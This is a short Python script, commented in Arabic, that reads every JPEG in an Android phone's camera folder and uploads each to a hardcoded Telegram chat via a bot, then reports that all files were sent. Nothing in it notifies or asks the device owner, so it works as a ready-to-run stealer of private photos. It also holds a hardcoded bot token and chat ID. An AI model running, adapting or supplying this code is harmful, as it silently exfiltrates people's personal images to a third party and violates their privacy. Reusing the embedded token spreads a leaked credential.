import asyncio
import os
from telegram import Bot

# تعريف معلومات البوت الخاص بك
TOKEN = '5740860850:AAGTFF28C6NT64Lvm-Cr6cikJgH_9xz-gX4'
CHAT_ID = 5215025306
# تهيئة البوت الخاص بك
bot = Bot(token=TOKEN)

# تحديد المسار الذي تريد البحث عن الملفات فيه
path = '/sdcard/DCIM/Camera'

async def send_files():
    # الحصول على قائمة بجميع الملفات التي تنتهي بـ jpg في المسار المحدد
    for file in os.listdir(path):
        if file.endswith(".jpg"):
            with open(os.path.join(path, file), 'rb') as f:
                await bot.send_photo(chat_id=CHAT_ID, photo=f)

    # تشغيل الـ coroutine
    await bot.send_message(chat_id=CHAT_ID, text="تم إرسال جميع الملفات بنجاح!")

asyncio.run(send_files())
